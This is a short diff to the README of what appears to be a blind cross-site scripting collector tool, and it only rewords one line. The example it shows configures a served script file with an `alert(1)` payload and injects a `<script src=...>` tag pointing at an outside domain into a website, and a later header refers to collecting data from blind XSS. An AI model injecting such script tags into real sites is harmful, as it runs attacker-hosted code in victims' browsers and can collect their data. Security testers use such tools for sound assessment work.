@@ -23,7 +23,7 @@ This endpoint will contain response specified in `assets/extensions.json` file
 **Example:**  
 Set `"CollectorPath":"examplepath"` in `.wwconfig`  
 Set `.js` extension with payload `alert(1)` in `assets/extensions.json`  
-and insert this payload to the website, alert will popup.  
+Insert this payload to the website, alert will popup.  
 `<script src=https://domain.com/examplepath.js></script>`  
 
 ### Collecting data from blind XSS  
